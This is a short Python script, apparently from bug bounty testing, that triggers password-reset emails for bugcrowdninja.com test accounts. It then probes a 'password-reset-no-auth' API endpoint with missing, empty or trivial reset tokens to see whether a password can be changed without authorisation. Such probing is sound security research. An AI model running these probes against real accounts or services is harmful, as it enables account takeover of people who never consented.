import json,subprocess,os
H=os.environ['H']; T=os.environ['T']; BB=os.environ['BB']
def req(path,body):
    cmd=['curl','-s','-m','30','-o','/tmp/b','-w','%{http_code}','-X','POST',H+path,
         '-H',BB,'-H','Content-Type: application/json','-d',json.dumps(body)]
    return subprocess.run(cmd,capture_output=True,text=True).stdout.strip(), open('/tmp/b',encoding='utf-8',errors='replace').read()
print("=== A. password-reset-email (forgot trigger) ===")
for e in ["golden-snow-4771@bugcrowdninja.com","zeno0@bugcrowdninja.com"]:
    c,b=req('/api/v1/users/password-reset-email',{"email":e})
    print(f"  {e:38} -> {c} {b[:180].replace(chr(10),' ')}")
print("\n=== B. password-reset-no-auth shape probe (SELF 231) ===")
tests=[
 {"email":"golden-snow-4771@bugcrowdninja.com","newPassword":"NewZx9!pass1"},
 {"email":"golden-snow-4771@bugcrowdninja.com","newPassword":"NewZx9!pass1","resetToken":""},
 {"email":"golden-snow-4771@bugcrowdninja.com","newPassword":"NewZx9!pass1","resetToken":"1"},
 {"email":"golden-snow-4771@bugcrowdninja.com","newPassword":"NewZx9!pass1","currentPassword":"wrong"},
]
for t in tests:
    c,b=req('/api/v1/users/password-reset-no-auth',t)
    print(f"  {json.dumps(t)[:95]:97} -> {c}")
    print(f"     {b[:200].replace(chr(10),' ')}")
